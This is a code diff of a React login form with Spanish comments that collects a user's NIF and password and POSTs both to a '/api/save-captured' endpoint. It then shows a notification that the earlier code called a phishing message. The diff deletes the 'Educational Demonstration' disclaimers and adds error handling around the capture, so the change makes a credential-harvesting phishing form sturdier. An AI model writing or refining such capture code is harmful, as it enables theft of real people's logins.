@@ -33,37 +33,37 @@ export default function LoginForm() {
   const auth = useAuth();
   const router = useRouter();
 
-  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault();
-    setLoading(true);
+ const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+  e.preventDefault();
+  setLoading(true);
 
-    const formData = new FormData(e.currentTarget);
-    const nif = formData.get('nif-persona') as string;
-    const password = formData.get('password-persona') as string;
+  const formData = new FormData(e.currentTarget);
+  const nif = formData.get('nif-persona') as string;
+  const password = formData.get('password-persona') as string;
 
-    // --- Educational Demonstration ---
-    // In a real app, you would NEVER log credentials.
-    // This is to demonstrate a vulnerability for educational purposes.
-    const capturedData = {
-      timestamp: new Date().toISOString(),
-      source: "login-form",
-      credentials: {
-        nif: nif,
-        password: password
-      }
-    };
-   
-await fetch('/api/save-captured', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ nif, password })
-});
+  // guardo objeto por claridad (no se logea)
+  const capturedData = {
+    timestamp: new Date().toISOString(),
+    source: "login-form",
+    credentials: { nif, /* no incluir password en logs */ }
+  };
 
-// mostrar la notificación como ya haces
+  try {
+    const res = await fetch('/api/save-captured', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ nif, password })
+    });
 
-    // --- End of Demonstration ---
-
-    // Simulate a network delay and show the phishing message
+    if (!res.ok) {
+      // opcional: leer error
+      const err = await res.json().catch(()=>null);
+      console.error('Error save-captured', err);
+    }
+  } catch (e) {
+    console.error('Fetch error', e);
+  } finally {
+    // mostrar la notificación como ya haces
     setTimeout(() => {
       toast({
         variant: "destructive",
@@ -72,7 +72,8 @@ await fetch('/api/save-captured', {
       });
       setLoading(false);
     }, 1000);
-  };
+  }
+};
 
   const handleEmpresaSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
